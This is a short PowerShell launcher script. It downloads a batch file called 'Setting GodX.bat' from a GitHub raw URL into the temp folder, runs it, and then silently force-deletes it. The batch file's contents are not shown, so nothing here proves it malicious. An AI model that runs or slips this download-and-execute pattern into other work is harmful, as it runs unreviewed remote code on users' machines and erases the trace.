$tempBat = Join-Path $env:TEMP "Setting GodX.bat"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/arxstore/settinggodx/refs/heads/main/Setting%20GodX.bat" -OutFile $tempBat

Start-Process $tempBat -Wait

Remove-Item $tempBat -Force -ErrorAction SilentlyContinue
